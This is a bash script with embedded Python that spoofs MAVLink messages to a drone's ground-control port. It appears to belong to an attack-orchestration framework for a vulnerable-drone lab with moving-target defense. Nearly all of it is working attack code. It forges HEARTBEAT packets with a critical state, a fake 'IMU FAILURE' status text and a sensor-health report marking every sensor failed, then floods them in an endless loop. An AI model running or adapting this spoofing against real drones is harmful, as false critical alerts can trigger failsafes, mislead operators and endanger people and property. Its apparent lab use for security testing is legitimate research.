#!/usr/bin/env bash
set -euo pipefail

# Attack: Critical Error Spoofing (MAVLink Spoofing, MTD-aware)
# Target Service: DRONE_MAVLINK (Default Port 14550, UDP)

# --- MTD_INTERFACE_START (Mandatory dynamic target acquisition) ---
# Orchestrator가 TARGET_IP, TARGET_PORT, TARGET_SERVICE를 주입해야 합니다.
if [[ -z "${TARGET_IP:-}" || -z "${TARGET_PORT:-}" ]]; then
    echo "ERROR: TARGET_IP and TARGET_PORT environment variables are not set." >&2
    echo "Attack aborted. Must be run via attack_orchestrator.py with MTD state resolution." >&2
    exit 1
fi

# 서비스 타입별 기본 포트 설정 (Drone MAVLink를 기본으로 가정)
case "${TARGET_SERVICE:-DRONE_MAVLINK}" in
    DRONE_MAVLINK)
        TARGET_PORT="${TARGET_PORT:-14550}"
        ;;
    *)
        : # 다른 서비스는 Orchestrator가 포트 값을 넣어준다고 가정
        ;;
esac

echo "[INFO] Target acquired: ${TARGET_IP}:${TARGET_PORT} (service=${TARGET_SERVICE:-DRONE_MAVLINK})"
# --- MTD_INTERFACE_END ---

# --- Common Log/BASE Setup ---
export BASE="${BASE:-$PWD}"
if [[ -f "$BASE/00_env.sh" ]]; then
    . "$BASE/00_env.sh"
else
    DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"
    mkdir -p "$(dirname "$DVD_LOG")"
    log(){ echo "[$(date +%F_%T)] $*"; }
    export -f log
fi

log "[ATTACK] id=critical-error-spoofing src=Critical-Error-Spoofing.md"
log "[BLOCK 1] type=python (MAVLink Critical Error Spoofing Script)"

# python3 스크립트를 인라인으로 실행하며 TARGET_IP:TARGET_PORT 인수를 전달합니다.
# MAVLink UDP 공격을 위해 Scapy가 필요하며, sudo 권한으로 실행됩니다.
sudo python3 -u - "${TARGET_IP}:${TARGET_PORT}" <<'PY'
# --- argv glue for converter ---
import os
import sys
import re
# 인수 없으면 환경변수 TARGET_IP:TARGET_PORT 사용 (Fallback/Debug)
if len(sys.argv) <= 1:
    target_ip = os.environ.get('TARGET_IP', '127.0.0.1')
    target_port = os.environ.get('TARGET_PORT', '14550')
    sys.argv = [sys.argv[0], f"{target_ip}:{target_port}"]

from pymavlink import mavutil
from scapy.all import *
import time
import sys

# MAV_STATE_CRITICAL을 포함하는 HEARTBEAT 메시지 생성
def create_heartbeat():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.heartbeat_encode(
        type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
        autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
        base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        custom_mode=3,
        system_status=mavutil.mavlink.MAV_STATE_CRITICAL
    ).pack(mav)

# CRITICAL SEVERITY를 가진 STATUSTEXT 메시지 생성
def create_statustext():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.statustext_encode(
        severity=mavutil.mavlink.MAV_SEVERITY_CRITICAL,
        text="CRITICAL ERROR: IMU FAILURE".encode('utf-8')
    ).pack(mav)

# 모든 센서 상태를 Unhealthy로 설정하는 SYS_STATUS 생성
def create_sys_status():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.sys_status_encode(
        onboard_control_sensors_present=0xFFFFFFFF,
        onboard_control_sensors_enabled=0xFFFFFFFF,
        onboard_control_sensors_health=0x00000000,
        load=1000,
        voltage_battery=0,
        current_battery=0,
        battery_remaining=0,
        drop_rate_comm=1000,
        errors_comm=100,
        errors_count1=100,
        errors_count2=100,
        errors_count3=100,
        errors_count4=100
    ).pack(mav)

def send_mavlink_packet(packet_data, target_ip, target_port):
    packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
    # verbose=False로 설정하여 콘솔 출력 최소화
    send(packet, verbose=False)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python critical-error-spoofing.py <ip:port>")
        sys.exit(1)

    target_ip, target_port_str = sys.argv[1].split(':', 1)
    try:
        target_port = int(target_port_str)
    except ValueError:
        print(f"Error: Invalid port number '{target_port_str}'.")
        sys.exit(1)

    print(f"[INFO] Starting Critical Error Spoofing to {target_ip}:{target_port} (UDP)")

    while True:
        send_mavlink_packet(create_heartbeat(), target_ip, target_port)
        send_mavlink_packet(create_statustext(), target_ip, target_port)
        send_mavlink_packet(create_sys_status(), target_ip, target_port)
        time.sleep(0.1)
PY

log "[BLOCK 2] type=control (In-Foreground Execution)"
# 공격은 Python 인라인 블록에서 포그라운드로 실행되며, Orchestrator에 의해 라이프사이클이 관리됩니다.